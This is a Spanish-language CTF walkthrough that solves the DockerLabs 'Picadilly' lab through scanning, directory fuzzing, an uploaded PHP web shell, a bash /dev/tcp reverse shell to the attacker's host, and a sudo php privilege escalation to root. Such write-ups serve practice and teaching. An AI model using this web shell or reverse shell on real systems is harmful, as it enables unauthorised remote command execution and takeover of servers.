### Pically-DockerLabs 🇪🇸

#### 1. Primero vamos a descargar nuestro archivo facilitado por dockerlabs y moverlo a nuestra área de trabajo.
```bash
 unzip picadilly.zip 
```

<img width="914" height="233" alt="image" src="https://github.com/user-attachments/assets/c12a4610-3376-4a98-a944-67522b64497e" />


#### 1.2 Ahora encenderemos el laboratoria.
```bash
sudo bash ./auto_deploy.sh picadilly.tar 
```

<img width="918" height="464" alt="image" src="https://github.com/user-attachments/assets/10b08202-fd0b-4593-8593-dbe58f97f2b3" />


#### 2. Comprobaremos la conexión mediante un ping.
```bash
 ping -c3 172.17.0.2
```

<img width="908" height="239" alt="image" src="https://github.com/user-attachments/assets/a0140cf7-5083-49aa-95e0-bb670deb28e3" />


#### 3. Vamos a escanear los puertos que estan abiertos con nmap.
```bash
 nmap -sCV 172.17.0.2
```


#### 4. Entraremos en la web y nos aparece este archivo de backup.

<img width="1009" height="313" alt="image" src="https://github.com/user-attachments/assets/9608f06b-f713-4911-886b-7c572358aa87" />

*Esta en el cifrado cesar `easycrxazy` *

#### 4.2 Sabiendo que el puerto 443 de https esta abierto entraremos.

<img width="1011" height="1003" alt="image" src="https://github.com/user-attachments/assets/eae56fe3-6904-40c9-bc3e-60d9b0c8d60f" />


#### 4.3 Ahora realizaremos un fuzzing de directorios ocultos para ver que directorios ocultos hay.
```bash
gobuster dir -u https://172.17.0.2/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,bak \
  -r \
  --no-tls-validation \
  -H "Host: picadilly.lab"
```

<img width="909" height="577" alt="image" src="https://github.com/user-attachments/assets/ffb42c95-6ffa-466a-af0e-b40c3184d77f" />

#### 4.4 Vamos a realizar un php malicioso para ver si nos podemos cumunicar con alguna shell dentro de la web.Con `nano shell.php`
```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```


#### 4.5 Probaremos la shell y se conecta perfectamente.

<img width="999" height="309" alt="image" src="https://github.com/user-attachments/assets/f3e814ea-56d0-4eb6-a570-383cd95486eb" />


#### 4.6 Ahora realizaremos una reverse shell mediante `nc` para pasarla a la terminal.
```bash
penelope -p 4444
bash -c "bash -i >& /dev/tcp/172.19.0.1/4444 0>&1"
```

<img width="1919" height="531" alt="image" src="https://github.com/user-attachments/assets/7cd66d98-651f-4298-84f2-4c81ece84ec8" />


#### 5. Ahora dentro de la shell vamos a ejecutar `find / -perm -4000 -type f 2>/dev/null`  para comenzar a escalar privilegios.
```bash
find / -perm -4000 -type f 2>/dev/null
```

<img width="917" height="305" alt="image" src="https://github.com/user-attachments/assets/800b9599-4386-49b4-bca8-cc4ba67d331d" />

#### 6. Entraremos al usuario mateo con la contraseña anteriormente cifrada y sin la x `easycrazy`
```bash
su mateo
```

<img width="924" height="176" alt="image" src="https://github.com/user-attachments/assets/b2fb19b6-96c8-4fd8-b8b2-1814c5ab7d68" />


#### 7. Ahora en el usuario mateo podremos apreciar con `sudo -l` los binarios que puede modificar.

<img width="923" height="160" alt="image" src="https://github.com/user-attachments/assets/d90916f9-1b5f-4a32-b7e1-bcb363310170" />


#### 8. Ejecutaremos el exploit para ascender de privilegios.
https://gtfobins.org/gtfobins/php/
```bash
sudo /usr/bin/php -r 'pcntl_exec("/bin/sh");'
```

<img width="918" height="243" alt="image" src="https://github.com/user-attachments/assets/b4693dcd-8c23-4b56-9128-3595d476784e" />























